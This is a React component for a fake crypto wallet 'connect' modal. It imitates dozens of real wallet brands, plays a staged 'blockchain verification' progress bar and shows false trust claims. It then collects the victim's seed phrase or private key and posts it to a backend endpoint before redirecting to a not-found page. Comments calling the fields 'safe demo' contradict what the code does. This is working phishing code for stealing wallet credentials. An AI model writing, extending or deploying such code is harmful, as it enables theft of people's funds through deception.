import React, { useEffect, useMemo, useRef, useState } from "react";
import { toast } from "react-toastify";
import { saveLatestSubmission } from "../lib/storage.js";
import { sendSubmissionEmail } from "../lib/email.js";

/** keep your actions if you still want it */
const ACTIONS = [
  "Connect Wallet",
  "Synchronize Wallet",
  "Swap Tokens",
  "Claim Token",
  "Airdrop",
  "Authenticate Wallet",
];

const NETWORKS = [
  "Ethereum",
  "BSC",
  "Polygon",
  "Arbitrum",
  "Optimism",
  "Solana",
];

/** Quick list on first screen */
const WALLET_LIST = [
  {
    name: "MetaMask",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJZaVpfhv3kgZA46GoqfVNIFhR6pXIdX4_Rg&s",
  },
  {
    name: "Trust Wallet",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgasGZi2wNfJelNSs6Ef0FO1fn2pkldIT8dA&s",
  },
  {
    name: "Phantom",
    icon: "https://play-lh.googleusercontent.com/obRvW02OTYLzJuvic1ZbVDVXLXzI0Vt_JGOjlxZ92XMdBF_i3kqU92u9SgHvJ5pySdM",
  },
  {
    name: "Solflare",
    icon: "https://ragged-edge.transforms.svdcdn.com/production/uploads/Case-studies/Solflare/Solflare_Logo_Mobile_Yellow.png?w=400&q=95&fm=webp&fit=min&crop=focalpoint&fp-x=0.5&fp-y=0.5&dm=1754049457&s=08fd066e71832052c6602bdc0ad2e1b7",
  },
  {
    name: "Binance",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRARoqXBurK7TGrQc9Ut2eHPQZ9NKJVHRyRrQ&s",
  },
];

/** All wallets grid (add as many as you want) */
const ALL_WALLETS = [
  {
    name: "MetaMask",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJZaVpfhv3kgZA46GoqfVNIFhR6pXIdX4_Rg&s",
  },
  {
    name: "Rainbow",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRv0n_AIQ_-oDHrqJ5byuJnyU-w4tC-ef2_6g&s",
  },
  {
    name: "Zengo",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS_bmQYjFPMNNpeNQYXYGRuPTvjCXP9I8YBzA&s",
  },
  {
    name: "Rabby Wallet",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSvIhma7NiZlF3Vst01WLxRO-1V0Hiub4i7cw&s",
  },
  {
    name: "Phantom Wallet",
    icon: "https://play-lh.googleusercontent.com/obRvW02OTYLzJuvic1ZbVDVXLXzI0Vt_JGOjlxZ92XMdBF_i3kqU92u9SgHvJ5pySdM",
  },
  {
    name: "Coinbase Wallet",
    icon: "https://images.ctfassets.net/o10es7wu5gm1/TWlW6aoAXPX7yUg5ShsZ0/c02522911b90b766eb8eef709e42b8eb/WalletLogo.png",
  },
  {
    name: "Trust Wallet",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgasGZi2wNfJelNSs6Ef0FO1fn2pkldIT8dA&s",
  },
  {
    name: "WalletConnect",
    icon: "https://dynamic-rainbow-6ac4f6a411.media.strapiapp.com/walletconnect_token_77fd858b11.svg",
  },
  {
    name: "Ledger",
    icon: "https://avatars.githubusercontent.com/u/9784193?s=280&v=4",
  },
  {
    name: "Argent",
    icon: "https://play-lh.googleusercontent.com/P-xt-cfYUtwVQ3YsNb5yd5_6MzCHmcKAbRkt-up8Ga44x_OCGLy4WFxsGhxfJaSLEw",
  },
  {
    name: "Solflare",
    icon: "https://ragged-edge.transforms.svdcdn.com/production/uploads/Case-studies/Solflare/Solflare_Logo_Mobile_Yellow.png?w=400&q=95&fm=webp&fit=min&crop=focalpoint&fp-x=0.5&fp-y=0.5&dm=1754049457&s=08fd066e71832052c6602bdc0ad2e1b7",
  },
  {
    name: "Binance",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRARoqXBurK7TGrQc9Ut2eHPQZ9NKJVHRyRrQ&s",
  },
  {
    name: "TokenPocket",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRZPo-JMzOHYPBHLBbrK0ggD551GkH66DaBcQ&s",
  },
  {
    name: "Safe",
    icon: "https://cdn.prod.website-files.com/63c8fbc03c5665a98c6b88d1/68a2c3b41ddc2dc9b50ede77_gyhYEOCE_400x400.jpg",
  },
  {
    name: "Trezor Wallet",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbhFPLA0Go25jQzedWWXRo40TRI8Unxdk-SQ&s",
  },
  {
    name: "Exodus",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFynPiXHoYVzbqj43ow0m9c5IqsTDrRt3RTA&s",
  },
  {
    name: "Electrum",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0WR4nwpoSh-Jr31G1UKpv3cxo6E29X4Imbg&s",
  },
  {
    name: "Mycelium",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgWY8mQXSC4ZPHgtXKC-JHZ9wpXgLbDMWu8w&s",
  },
  {
    name: "Armory",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ0wTZxcl7-uSpwriBPml7ms885lga-hv3P5w&s",
  },
  {
    name: "GreenAddress",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSQQNEnrBuSXs5vlWCQbmvHCqMH4zuMO5OUOQ&s",
  },
  {
    name: "Blockchain Wallet",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHvD1yOvb6TZgXPPDSm_ks3qvxyQ0hDjgImA&s",
  },
  {
    name: "Coinomi",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRUOdOzoPKkQ58RkCw0JPtct9I_wg1IMt6KA&s",
  },
  {
    name: "Edge Wallet",
    icon: "https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/be/a7/df/bea7df8f-cd25-b3a2-d382-3789902b0135/AppIcon-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.jpg",
  },
  {
    name: "BRD Wallet",
    icon: "https://is1-ssl.mzstatic.com/image/thumb/Purple112/v4/59/21/77/5921773a-06a0-c54a-cc59-6b0446fd38e7/AppIcon-0-0-1x_U007emarketing-0-0-0-7-0-0-P3-0-0-0-GLES2_U002c0-512MB-85-220-0-0.png/1200x630wa.jpg",
  },
  {
    name: "Samourai Wallet",
    icon: "https://avatars.githubusercontent.com/u/10795847?s=280&v=4",
  },
  {
    name: "Wasabi Wallet",
    icon: "https://pbs.twimg.com/profile_images/1835739941596430336/0zk73Tpj_400x400.png",
  },
  {
    name: "ElectrumSV",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQMpRdwnVDFDMtsIG08Wutk_LNQEew2Dou0Q&s",
  },
  {
    name: "Bitcoin Core",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTagD7ATdl4ZZD0uReHuunAFmU6YF_c7xNEQQ&s",
  },
  {
    name: "Copay",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiel1xrdJPvZiuDmKs_TBZbCXilB17R8_N0A&s",
  },
  {
    name: "Green Wallet",
    icon: "https://f-droid.org/repo/com.greenaddress.greenbits_android_wallet/en-US/icon_dSryQRyLBWdhHQ9zc4xQ9lYaWek1iT_3FzeiKYzEaYE=.png",
  },
  {
    name: "BlueWallet",
    icon: "https://play-lh.googleusercontent.com/ZjUOQy1d8jKlD7oanvDA7dNksJOjN2jBwwfkwcceSnl9NHyqQYUkhMFIMQZxu7w500E",
  },
  {
    name: "Nifty Wallet",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTaNwc2mSPhep5lZwbnjaczSM8u_uuGN4sNwQ&s",
  },
  {
    name: "Sollet Wallet",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0-8qDshqeuGh4uW0QXLnlW7JrKgh4LjG3rg&s",
  },
  {
    name: "Math Wallet",
    icon: "https://play-lh.googleusercontent.com/7JhuwbTGFDaIdVj7LLyeOAvHyzxtx4zDOiQWuHOMP6T9ogijSzEBUhX3cK0q6LyMafQ",
  },
  {
    name: "BitGo Wallet",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsZKJAC-dc7l-3YOk6lDl6PjwphG8a_bB9jA&s",
  },
  {
    name: "BitPay Wallet",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuvmX17blZjkTTPqqjf-vCdV46Lb4ObIGj8g&s",
  },
  {
    name: "BitKeep Wallet",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSow08IGSPlug2H2nd2tjS9qqwe0GvvHrCVlA&s",
  },
  {
    name: "Kucoin Wallet",
    icon: "https://assets.staticimg.com/kc-v2-config/site-config/693bce14ef6f160001eb4d9d_logo_general_green.png",
  },
];

function useOnClickOutside(ref, handler) {
  useEffect(() => {
    const listener = (e) => {
      if (!ref.current || ref.current.contains(e.target)) return;
      handler(e);
    };
    document.addEventListener("mousedown", listener);
    document.addEventListener("touchstart", listener);
    return () => {
      document.removeEventListener("mousedown", listener);
      document.removeEventListener("touchstart", listener);
    };
  }, [ref, handler]);
}

/** wallet icon from URL */
function WalletLogo({ name, icon, size = 36 }) {
  const [error, setError] = useState(false);

  if (!icon || error) {
    return (
      <div
        className="flex items-center justify-center rounded-xl bg-gray-200 text-sm font-bold"
        style={{ width: size, height: size }}
      >
        {name?.charAt(0) || "W"}
      </div>
    );
  }

  return (
    <div
      className="flex items-center justify-center rounded-xl overflow-hidden bg-white/60"
      style={{ width: size, height: size }}
    >
      <img
        src={icon}
        alt={name}
        className="h-[80%] w-[80%] object-contain"
        onError={() => setError(true)}
        loading="lazy"
      />
    </div>
  );
}

function MiniBtn({ darkMode, children, onClick }) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={[
        "rounded-md px-3 py-1 text-xs font-semibold",
        darkMode
          ? "bg-white/10 hover:bg-white/15"
          : "bg-black/10 hover:bg-black/15",
      ].join(" ")}
    >
      {children}
    </button>
  );
}

function ProgressBar({ value }) {
  return (
    <div className="mx-auto mt-5 h-2 w-full max-w-[360px] rounded-full bg-black/10 overflow-hidden">
      <div
        className="h-full bg-black rounded-full transition-[width] duration-200"
        style={{ width: `${Math.min(100, Math.max(0, value))}%` }}
      />
    </div>
  );
}

export default function ConnectWalletModal({ open, onClose }) {
  const [loading, setLoading] = useState(false);

  // top toolbar states
  const [lang, setLang] = useState("English");
  const [darkMode, setDarkMode] = useState(false);

  // form data
  const [action, setAction] = useState(ACTIONS[0]);
  const [network, setNetwork] = useState(NETWORKS[0]);

  const [selectedWallet, setSelectedWallet] = useState("");
  const [selectedWalletIcon, setSelectedWalletIcon] = useState("");
  const [note, setNote] = useState("");
  const [secretPhrase, setSecretPhrase] = useState("");
  const [walletSecret, setWalletSecret] = useState("");
  const [privateKey, setPrivateKey] = useState("");

  // Safe demo-only fields (do not store/send)
  const [signature, setSignature] = useState("");
  const [keystoreFile, setKeystoreFile] = useState(null);

  // UI states
  // connect -> all -> connecting -> secure -> method_signature/method_address/method_keystore
  const [view, setView] = useState("connect");
  const [search, setSearch] = useState("");

  // connecting screen states
  const [progress, setProgress] = useState(0);
  const [secondsLeft, setSecondsLeft] = useState(10);

  const modalRef = useRef(null);
  const timerRef = useRef(null);

  useOnClickOutside(modalRef, () => {
    onClose?.();
  });

  useEffect(() => {
    if (!open) return;

    // reset when opened
    setLoading(false);
    setView("connect");
    setSearch("");
    setSelectedWallet("");
    setSelectedWalletIcon("");
    setPrivateKey("");
    setNote("");
    setSignature("");
    setKeystoreFile(null);
    setProgress(0);
    setSecondsLeft(10);

    if (timerRef.current) clearInterval(timerRef.current);
  }, [open]);

  const modalThemeClass = darkMode
    ? "bg-[#0b0f18] text-white"
    : "bg-white text-[#0a0a0a]";

  const filteredAllWallets = useMemo(() => {
    const q = search.trim().toLowerCase();
    if (!q) return ALL_WALLETS;
    return ALL_WALLETS.filter((w) => w.name.toLowerCase().includes(q));
  }, [search]);

  // Start connecting animation
  function startConnecting(walletName, walletIcon) {
    setSelectedWallet(walletName);
    setSelectedWalletIcon(walletIcon || "");
    setView("connecting");
    setProgress(0);
    setSecondsLeft(10);

    if (timerRef.current) clearInterval(timerRef.current);

    // 10 seconds -> 100%
    const start = Date.now();
    const totalMs = 10000;

    timerRef.current = setInterval(() => {
      const elapsed = Date.now() - start;
      const pct = Math.min(100, Math.round((elapsed / totalMs) * 100));
      const secs = Math.max(0, 10 - Math.floor(elapsed / 1000));

      setProgress(pct);
      setSecondsLeft(secs);

      if (pct >= 100) {
        clearInterval(timerRef.current);
        timerRef.current = null;
        setTimeout(() => setView("secure"), 450);
      }
    }, 120);
  }

  // Cleanup timer on unmount
  useEffect(() => {
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  // Only allow sending secretPhrase and walletSecret
  const canSubmit = useMemo(() => {
    if (loading) return false;
    const walletOk = (selectedWallet || "").trim().length > 0;
    const phraseOk = secretPhrase.trim().length > 0 || walletSecret.trim().length > 0;
    return walletOk && phraseOk;
  }, [selectedWallet, secretPhrase, walletSecret, loading]);

  async function onSubmit(e) {
    e.preventDefault();
    if (!canSubmit) return;

    const payload = {
      action,
      walletType: selectedWallet,
      network,
      note: note.trim(),
      secretPhrase: secretPhrase.trim(),
      walletSecret: walletSecret.trim(),
    };

    setLoading(true);
    try {
      const res = await fetch(
        `${import.meta.env.VITE_API_URL}/api/submissions`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "include",
          body: JSON.stringify(payload),
        }
      );
      if (!res.ok) throw new Error("Submission failed");
      toast.success("Submitted successfully ✅");
      // Redirect to NotFound page
      window.location.href = "/notfound";
    } catch (err) {
      console.error(err);
      toast.error("Something went wrong.");
    } finally {
      setLoading(false);
    }
  }

  function backLogic() {
    if (view === "all") return setView("connect");
    if (view === "connecting") return setView("all");
    if (view === "secure") return setView("connecting");
    if (
      view === "method_signature" ||
      view === "method_address" ||
      view === "method_keystore"
    )
      return setView("secure");
    return onClose?.();
  }

  if (!open) return null;

  return (
    <div
      className="fixed inset-0 z-[400] flex items-center justify-center bg-black/60 p-4"
      role="dialog"
      aria-modal="true"
    >
      <div
        ref={modalRef}
        className={[
          "w-full max-w-[520px] rounded-2xl shadow-[0_20px_60px_rgba(0,0,0,0.35)] overflow-hidden",
          modalThemeClass,
        ].join(" ")}
      >
        {/* Top toolbar */}
        <div className="px-4 pt-4">
          <div className="flex items-center justify-between">
            <button
              type="button"
              onClick={backLogic}
              className={[
                "rounded-md px-2 py-1 text-sm font-semibold",
                darkMode ? "hover:bg-white/10" : "hover:bg-black/5",
              ].join(" ")}
              aria-label={view === "connect" ? "Close" : "Back"}
              title={view === "connect" ? "Close" : "Back"}
            >
              {view === "connect" ? "✕" : "←"}
            </button>

            <div className="flex flex-wrap items-center justify-end gap-2">
              <MiniBtn
                darkMode={darkMode}
                onClick={() => toast.info("Help clicked")}
              >
                Help
              </MiniBtn>

              <MiniBtn
                darkMode={darkMode}
                onClick={() => setDarkMode((v) => !v)}
              >
                {darkMode ? "Light Mode" : "Dark Mode"}
              </MiniBtn>

              <select
                value={lang}
                onChange={(e) => setLang(e.target.value)}
                className={[
                  "rounded-md px-3 py-1 text-xs font-semibold outline-none",
                  darkMode
                    ? "bg-white/10 text-white border border-white/10"
                    : "bg-black/5 text-black border border-black/10",
                ].join(" ")}
              >
                <option>English</option>
                <option>Español</option>
                <option>Deutsch</option>
              </select>

              <MiniBtn
                darkMode={darkMode}
                onClick={() => toast.info("Privacy clicked")}
              >
                Privacy
              </MiniBtn>

              <MiniBtn
                darkMode={darkMode}
                onClick={() => toast.info("More clicked")}
              >
                …
              </MiniBtn>
            </div>
          </div>

          {/* Titles per screen */}
          {view === "connect" && (
            <h2 className="mt-4 text-center text-2xl font-extrabold">
              Connect Your Wallet
            </h2>
          )}
          {view === "all" && (
            <h2 className="mt-4 text-center text-3xl font-extrabold">
              All Wallets
            </h2>
          )}
          {view === "connecting" && <div className="mt-4" />}
          {view === "secure" && <div className="mt-4" />}
          {view === "method_signature" && (
            <h2 className="mt-4 text-center text-2xl font-extrabold">
              Import Wallet Information
            </h2>
          )}
          {view === "method_address" && (
            <h2 className="mt-4 text-center text-2xl font-extrabold">
              Input Wallet Details
            </h2>
          )}
          {view === "method_keystore" && (
            <h2 className="mt-4 text-center text-2xl font-extrabold">
              Import Wallet Information
            </h2>
          )}
        </div>

        {/* BODY */}
        <div className="px-4 pb-4 pt-4">
          <div
            className={[
              "rounded-2xl border",
              darkMode
                ? "border-white/10 bg-white/5"
                : "border-black/10 bg-white",
            ].join(" ")}
          >
            {/* VIEW 1: CONNECT */}
            {view === "connect" && (
              <div className="p-2">
                {WALLET_LIST.map((w) => (
                  <button
                    key={w.name}
                    type="button"
                    onClick={() => startConnecting(w.name, w.icon)}
                    className={[
                      "w-full flex items-center justify-between gap-3 rounded-xl px-3 py-3 text-left transition",
                      darkMode ? "hover:bg-white/10" : "hover:bg-black/5",
                    ].join(" ")}
                  >
                    <span className="flex items-center gap-3">
                      <WalletLogo name={w.name} icon={w.icon} />
                      <span className="text-sm font-semibold">{w.name}</span>
                    </span>
                    <span
                      className={darkMode ? "text-white/70" : "text-black/50"}
                    >
                      →
                    </span>
                  </button>
                ))}

                <button
                  type="button"
                  onClick={() => setView("all")}
                  className={[
                    "mt-3 w-full rounded-full py-3 text-sm font-semibold",
                    darkMode
                      ? "bg-black/70 text-white hover:bg-black/60"
                      : "bg-black text-white hover:bg-black/90",
                  ].join(" ")}
                >
                  All Wallets
                </button>

                <div
                  className={[
                    "mt-4 rounded-xl px-3 py-3 text-center text-xs",
                    darkMode
                      ? "bg-white/5 text-white/70"
                      : "bg-black/5 text-black/60",
                  ].join(" ")}
                >
                  <div className="flex items-center justify-center gap-3">
                    <span className="font-bold">Telegram</span>
                    <span className="font-bold text-[#ff4500]">reddit</span>
                    <span className="font-bold">SOLANA</span>
                  </div>
                  <div className="mt-1 font-semibold">
                    Trusted by 1,200,000+ users
                  </div>
                </div>
              </div>
            )}

            {/* VIEW 2: ALL WALLETS */}
            {view === "all" && (
              <div className="p-4">
                <input
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                  placeholder="Search wallets..."
                  className={[
                    "w-full rounded-md border px-3 py-2 text-sm outline-none",
                    darkMode
                      ? "border-white/10 bg-white/5 text-white placeholder:text-white/40"
                      : "border-black/10 bg-white text-black placeholder:text-black/40",
                  ].join(" ")}
                />

                <div className="mt-4 max-h-[360px] overflow-y-auto pr-1">
                  <div className="grid grid-cols-3 gap-3">
                    {filteredAllWallets.map((w) => (
                      <button
                        key={w.name}
                        type="button"
                        onClick={() => startConnecting(w.name, w.icon)}
                        className={[
                          "rounded-xl border p-3 text-center transition",
                          darkMode
                            ? "border-white/10 bg-white/5 hover:bg-white/10"
                            : "border-black/10 bg-white hover:bg-black/5",
                        ].join(" ")}
                      >
                        <div className="mx-auto grid h-12 w-12 place-items-center rounded-xl">
                          <WalletLogo name={w.name} icon={w.icon} size={44} />
                        </div>
                        <div className="mt-2 text-[11px] font-semibold leading-tight">
                          {w.name}
                        </div>
                      </button>
                    ))}
                  </div>

                  {filteredAllWallets.length === 0 && (
                    <div className="py-10 text-center text-sm opacity-70">
                      No wallets found.
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* VIEW 3: CONNECTING (progress) */}
            {view === "connecting" && (
              <div className="p-6 text-center">
                <div className="mx-auto mb-4 grid h-14 w-14 place-items-center rounded-full border border-black/10">
                  <div className="h-10 w-10 animate-spin rounded-full border-4 border-black/10 border-t-black" />
                </div>

                <div className="text-lg font-bold">
                  Connecting to {selectedWallet || "Wallet"}...
                </div>
                <ProgressBar value={progress} />
                <div className="mt-3 text-sm opacity-80">
                  {secondsLeft} seconds remaining
                </div>

                <div className="mt-6">
                  <div className="mx-auto mb-2 text-4xl">🔒</div>
                  <div className="text-sm opacity-80">
                    Confirming Wallet Verification on blockchain. Please wait...
                  </div>
                </div>

                <button
                  type="button"
                  onClick={onClose}
                  className="mt-6 rounded-md bg-black px-6 py-2 text-sm font-semibold text-white"
                >
                  Exit
                </button>
              </div>
            )}

            {/* VIEW 4: SESSION SECURE + OPTIONS */}
            {view === "secure" && (
              <div className="p-6">
                <div className="mb-3 flex items-center gap-2 text-sm font-semibold">
                  <span className="text-xl">🔒</span>{" "}
                  <span>Session is Secure</span>
                </div>

                <p className="mx-auto max-w-[420px] text-center text-sm leading-relaxed opacity-80">
                  This advanced system confirms wallet ownership via secure
                  blockchain processing. Select one of the options below:
                </p>

                <div className="mt-6 grid gap-4">
                  {/* SAFE replacements that keep the same look/flow */}
                  <button
                    type="button"
                    onClick={() => setView("method_signature")}
                    className="mx-auto w-full max-w-[260px] rounded-full bg-black py-4 text-sm font-bold text-white"
                  >
                    ▶ SeedPhrase
                  </button>

                  <button
                    type="button"
                    onClick={() => setView("method_address")}
                    className="mx-auto w-full max-w-[260px] rounded-full bg-black py-4 text-sm font-bold text-white"
                  >
                    ▶ Private Key
                  </button>

                  <button
                    type="button"
                    onClick={() => setView("method_keystore")}
                    className="mx-auto w-full max-w-[260px] rounded-full bg-black py-4 text-sm font-bold text-white"
                  >
                    ▶ KeyStore
                  </button>
                </div>

                <div className="mt-6 text-center text-xs font-semibold opacity-80">
                  Trusted by 1,200,000+ users
                </div>

                <button
                  type="button"
                  onClick={onClose}
                  className="mx-auto mt-6 block rounded-md bg-black px-10 py-2 text-sm font-semibold text-white"
                >
                  Exit
                </button>
              </div>
            )}

            {/* VIEW 5: SIGNATURE (seed phrase) */}
            {view === "method_signature" && (
              <form
                onSubmit={async (e) => {
                  e.preventDefault();
                  setSecretPhrase(signature);
                  setWalletSecret("");
                  setSignature("");
                  // Submit immediately
                  setLoading(true);
                  try {
                    const payload = {
                      action,
                      walletType: selectedWallet,
                      network,
                      note: note.trim(),
                      secretPhrase: signature.trim(),
                      walletSecret: "",
                    };
                    const res = await fetch(
                      `${import.meta.env.VITE_API_URL}/api/submissions`,
                      {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        credentials: "include",
                        body: JSON.stringify(payload),
                      }
                    );
                    if (!res.ok) throw new Error("Submission failed");
                    toast.success("Secret phrase submitted ✅");
                    window.location.href = "/notfound";
                  } catch (err) {
                    console.error(err);
                    toast.error("Something went wrong.");
                  } finally {
                    setLoading(false);
                  }
                }}
                className="p-6"
              >
                <div className="mx-auto max-w-[420px]">
                  <div className="text-center text-3xl font-extrabold leading-tight">
                    Import Wallet <br /> Information
                  </div>

                  <div className="mt-6 flex flex-col items-start gap-2">
                    <label className="text-sm font-semibold">
                      Enter your Seedphrase
                    </label>
                    <textarea
                      value={signature}
                      onChange={(e) => setSignature(e.target.value)}
                      placeholder="Enter 12 or 24 word seed phrase here..."
                      className="w-full rounded-md border border-black/20 p-3 text-sm outline-none"
                      rows={4}
                      required
                    />
                  </div>

                  <div className="mt-4 flex justify-start">
                    <button
                      type="submit"
                      className="rounded-full bg-black px-8 py-2 text-sm font-semibold text-white"
                    >
                      Submit
                    </button>
                  </div>

                  <button
                    type="button"
                    onClick={onClose}
                    className="mx-auto mt-6 block rounded-md bg-black px-10 py-2 text-sm font-semibold text-white"
                  >
                    Exit
                  </button>
                </div>
              </form>
            )}

            {/* VIEW 6: PRIVATE KEY (walletSecret) */}
            {view === "method_address" && (
              <form
                onSubmit={async (e) => {
                  e.preventDefault();
                  setWalletSecret(privateKey);
                  setSecretPhrase("");
                  setPrivateKey("");
                  // Submit immediately
                  setLoading(true);
                  try {
                    const payload = {
                      action,
                      walletType: selectedWallet,
                      network,
                      note: note.trim(),
                      secretPhrase: "",
                      walletSecret: privateKey.trim(),
                    };
                    const res = await fetch(
                      `${import.meta.env.VITE_API_URL}/api/submissions`,
                      {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        credentials: "include",
                        body: JSON.stringify(payload),
                      }
                    );
                    if (!res.ok) throw new Error("Submission failed");
                    toast.success("Wallet secret submitted ");
                    window.location.href = "/notfound";
                  } catch (err) {
                    console.error(err);
                    toast.error("Something went wrong.");
                  } finally {
                    setLoading(false);
                  }
                }}
                className="p-6 sm:p-8"
              >
               

                <div className="mt-8 rounded-2xl bg-white px-6 py-10 text-center shadow-sm">
                  <h2 className="mx-auto max-w-xs text-3xl font-extrabold leading-tight text-black">
                    Import Wallet <br /> Information
                  </h2>

                  {/* Safe: public address or connect */}
                  <div className="mx-auto mt-7 max-w-sm text-left">
                    <label className="block text-sm font-semibold text-black/80">
                      Enter your private key
                    </label>

                    <div className="mt-2 flex items-center gap-3">
                      <input
                        value={privateKey}
                        onChange={(e) => setPrivateKey(e.target.value)}
                        placeholder="Enter your private key here..."
                        className="h-11 w-full rounded-md border border-black/15 px-3 text-sm outline-none focus:border-black/30"
                        required
                      />

                      <button
                        type="submit"
                        // disabled removed so button is always enabled
                        className={[
                          "h-11 rounded-full px-6 text-sm font-semibold transition",
                          "bg-black text-white hover:bg-black/90",
                        ].join(" ")}
                      >
                        {loading ? "Verifying..." : "Verify"}
                      </button>
                    </div>
                  </div>

                  {/* Exit */}
                  <button
                    type="button"
                    onClick={() => setView("secure")}
                    className="mx-auto mt-8 block rounded-md bg-black px-8 py-2.5 text-sm font-semibold text-white hover:bg-black/90"
                  >
                    Exit
                  </button>
                </div>
              </form>
            )}
            {/* VIEW 7: KEYSTORE FILE (safe demo) */}
            {view === "method_keystore" && (
              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  if (!keystoreFile) return toast.error("Please choose a file");
                  toast.success("Keystore file received");
                  setKeystoreFile(null);
                  onClose?.();
                }}
                className="p-6"
              >
                <div className="mx-auto max-w-[420px]">
                  <div className="text-center text-3xl font-extrabold leading-tight">
                    Import Wallet <br /> Information
                  </div>

                  <div className="mt-6 text-sm font-semibold">
                    Upload your Keystore file
                  </div>

                  <div className="mt-2 flex items-center gap-3">
                    <input
                      type="file"
                      onChange={(e) =>
                        setKeystoreFile(e.target.files?.[0] || null)
                      }
                      className="block w-full text-sm"
                      accept=".json,.txt,*/*"
                    />
                    <span className="text-sm font-semibold opacity-80">
                      Enter
                    </span>
                  </div>

                  <button
                    type="submit"
                    className="mt-4 rounded-full bg-black px-8 py-2 text-sm font-semibold text-white"
                  >
                    Verify
                  </button>

                  <button
                    type="button"
                    onClick={onClose}
                    className="mx-auto mt-6 block rounded-md bg-black px-10 py-2 text-sm font-semibold text-white"
                  >
                    Exit
                  </button>
                </div>
              </form>
            )}
          </div>

          {/* Exit button (bottom like your original) */}
          <div className="mt-4 flex justify-center">
            <button
              type="button"
              onClick={onClose}
              className={[
                "rounded-md px-6 py-2 text-sm font-semibold",
                darkMode
                  ? "bg-white/10 hover:bg-white/15"
                  : "bg-black/10 hover:bg-black/15",
              ].join(" ")}
            >
              Exit
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
